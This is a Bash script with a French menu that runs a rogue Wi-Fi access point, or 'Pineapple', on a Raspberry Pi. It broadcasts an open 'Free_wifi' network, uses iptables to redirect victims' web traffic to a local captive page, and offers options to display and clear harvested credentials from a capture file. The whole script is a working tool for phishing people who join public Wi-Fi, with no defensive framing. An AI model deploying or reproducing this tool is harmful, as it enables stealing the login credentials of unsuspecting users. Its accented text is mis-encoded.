#!/bin/bash

WLAN_FAKEAP="wlan1"
GATEWAY="10.0.0.1"
DIR="/home/pi/pineapple"
CAPTURE_FILE="$DIR/captures/creds.txt"

start_pineapple() {
    echo "[*] D√©marrage du fake AP sur $WLAN_FAKEAP..."
    sudo ip link set "$WLAN_FAKEAP" down
    sudo iw dev "$WLAN_FAKEAP" set type __ap
    sudo ip addr flush dev "$WLAN_FAKEAP"
    sudo ip addr add "$GATEWAY/24" dev "$WLAN_FAKEAP"
    sudo ip link set "$WLAN_FAKEAP" up

    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
    sudo iptables -F
    sudo iptables -t nat -F
    sudo iptables -t nat -A PREROUTING -i "$WLAN_FAKEAP" -p tcp --dport 80 -j DNAT --to "$GATEWAY":80
    sudo iptables -t nat -A POSTROUTING -j MASQUERADE

    echo "[*] Nettoyage et d√©ploiement des fichiers web..."
    sudo rm -rf /var/www/html/*
    sudo cp -r "$DIR/www/"* /var/www/html/
    sudo systemctl restart lighttpd

    sudo dnsmasq -C "$DIR/dnsmasq.conf"
    sudo hostapd "$DIR/hostapd.conf" &

    echo "[‚úî] Pineapple lanc√©. SSID : Free_wifi"
    read -p "Appuie sur Entr√©e pour revenir au menu..."
}

stop_pineapple() {
    echo "[*] Arr√™t du Pineapple..."
    sudo killall hostapd dnsmasq 2>/dev/null
    sudo iptables -F
    sudo iptables -t nat -F
    sudo ip addr flush dev "$WLAN_FAKEAP"
    sudo ip link set "$WLAN_FAKEAP" down
    sudo iw dev "$WLAN_FAKEAP" set type managed
    sudo ip link set "$WLAN_FAKEAP" up
    echo "[‚úî] Pineapple arr√™t√©."
    read -p "Appuie sur Entr√©e pour revenir au menu..."
}

show_creds() {
    echo -e "\n[üìÑ] Identifiants captur√©s :"
    if [[ -f "$CAPTURE_FILE" ]]; then
        cat "$CAPTURE_FILE"
    else
        echo "Aucun identifiant trouv√©."
    fi
    echo
    read -p "Appuie sur Entr√©e pour revenir au menu..."
}

clear_creds() {
    if [[ -f "$CAPTURE_FILE" ]]; then
        > "$CAPTURE_FILE"
        echo "[‚úî] Identifiants effac√©s."
    else
        echo "Aucun fichier √† vider."
    fi
    read -p "Appuie sur Entr√©e pour revenir au menu..."
}

while true; do
    clear
    echo "============================="
    echo "   üçç MENU PINEAPPLE RPi"
    echo "============================="
    echo "1. D√©marrer le Pineapple"
    echo "2. Arr√™ter le Pineapple"
    echo "3. Voir les identifiants captur√©s"
    echo "4. Vider les identifiants"
    echo "5. Quitter"
    echo "-----------------------------"
    read -p "Choix [1-5] : " choice

    case "$choice" in
        1) start_pineapple ;;
        2) stop_pineapple ;;
        3) show_creds ;;
        4) clear_creds ;;
        5) echo "√Ä bient√¥t !"; exit 0 ;;
        *) echo "Option invalide."; sleep 1 ;;
    esac
done